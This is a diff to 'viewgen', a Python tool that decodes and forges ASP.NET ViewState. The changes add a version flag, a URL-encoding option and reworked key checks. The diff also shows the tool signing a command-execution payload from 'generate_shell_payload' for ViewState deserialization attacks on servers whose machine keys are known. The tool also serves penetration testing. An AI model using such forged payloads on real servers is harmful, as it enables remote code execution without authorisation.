@@ -17,6 +17,10 @@ import os
 import binascii
 import struct
 import sys
+import urllib.parse
+
+
+VERSION = 0.2
 
 
 pad = lambda s, bs: s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode("ascii")
@@ -252,9 +256,11 @@ def parse_args():
 	parser.add_argument("--valg", help="validation algorithm", required=False, default="")
 	parser.add_argument("--dkey", help="decryption key", required=False, default="")
 	parser.add_argument("--dalg", help="decryption algorithm", required=False, default="")
+	parser.add_argument("-u", "--urlencode", help="URL encode viewstates", required=False, default=False, action="store_true")
 	parser.add_argument("-e", "--encrypted", help="ViewState is encrypted", required=False, default=False, action="store_true")
 	parser.add_argument("payload", help="ViewState payload (base 64 encoded)", nargs="?")
 	parser.add_argument("-f", "--file", help="read ViewState payload from file", required=False)
+	parser.add_argument("--version", help="show viewgen version", required=False, action="store_true")
 	args = parser.parse_args()
 
 	if len(sys.argv) == 1:
@@ -268,18 +274,26 @@ def parse_args():
 
 
 def run_viewgen(args):
-	if not args.payload:
+	if args.version:
+		print("viewgen %s" % VERSION)
+		exit(0)
+	
+	generate = not args.decode and not args.check and not args.guess
+
+	if not args.payload and not args.command:
 		if args.file:
 			with open(args.file) as f:
 				args.payload = f.read()
 		else:
 			args.payload = sys.stdin.read().rstrip()
 
-	generate = not args.decode and not args.check and not args.guess
-
-	if generate or args.check:
-		if not args.vkey or not args.valg or not args.dkey or not args.dalg:
-			warning("Please provide validation/decryption keys and algorithms or a valid web.config")
+	if args.encrypted:
+		if not args.dkey or not args.dalg:
+			warning("Please provide deryption key and algorithm or a valid web.config")
+			exit(1)
+	else:
+		if not args.vkey or not args.valg:
+			warning("Please provide validation key and algorithm or a valid web.config")
 			exit(1)
 
 	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted)
@@ -307,8 +321,11 @@ def run_viewgen(args):
 			warning("ViewState is encrypted")
 			candidates = viewgen.guess_algorithms(args.payload)
 			success("Algorithm candidates:")
-			for candidate in candidates:
-				print("%s %s" % (candidate[0], candidate[1].upper()))
+			if candidates:
+				for candidate in candidates:
+					print("%s %s" % (candidate[0], candidate[1].upper()))
+			else:
+				warning("No candidates found")
 		else:
 			if viewgen.encrypted:
 				success("ViewState has been decrypted")
@@ -325,7 +342,9 @@ def run_viewgen(args):
 			result = viewgen.encode(args.payload)
 		else:
 			result = viewgen.encode(generate_shell_payload(args.command))
-		print(str(result, "utf-8"))
+		if args.urlencode:
+			result = urllib.parse.quote(result, safe="")
+		print(result)
 
 
 if __name__ == "__main__":
